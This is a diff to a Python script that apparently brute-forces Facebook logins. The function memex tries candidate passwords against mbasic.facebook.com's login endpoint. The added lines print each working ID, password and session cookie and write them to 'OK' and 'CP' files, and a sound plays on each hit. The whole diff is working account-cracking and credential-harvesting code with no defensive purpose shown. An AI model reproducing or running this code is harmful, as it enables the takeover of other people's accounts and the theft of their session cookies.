@@ -1224,9 +1224,28 @@ def memex(idf,pwv):
 			p = r.get("https://mbasic.facebook.com/")
 			b = r.post("https://mbasic.facebook.com/login.php", data={"email":idf, "pass":pw, "login": "submit"})
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
-			if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":idf,"pass":pw,"cookies":kuki}
-			elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":idf,"pass":pw,"cookies":kuki}
-			else:return {"status":"error","email":idf,"pass":pw}
+			if "c_user" in r.cookies.get_dict().keys():
+				ok+=1
+				coki=r.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
+				print('\n')
+				statusok = f'\n\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+				statusok1 = nel(statusok, width=80, style='bold green', title='OK')
+				cetak(statusok1)
+				os.popen('play-audio o.mp3')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				break
+			elif "checkpoint" in r.cookies.get_dict().keys():
+				cp+=1
+				print('\n')
+				statuscp = f'\n\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+				statuscp1 = nel(statuscp, width=80, style='bold yellow', title='CP')
+				cetak(statuscp1)
+				os.popen('play-audio c.mp3')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				break
+			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
 	loop+=1
 #-----------------------[ CEK APLIKASI ]--------------------#
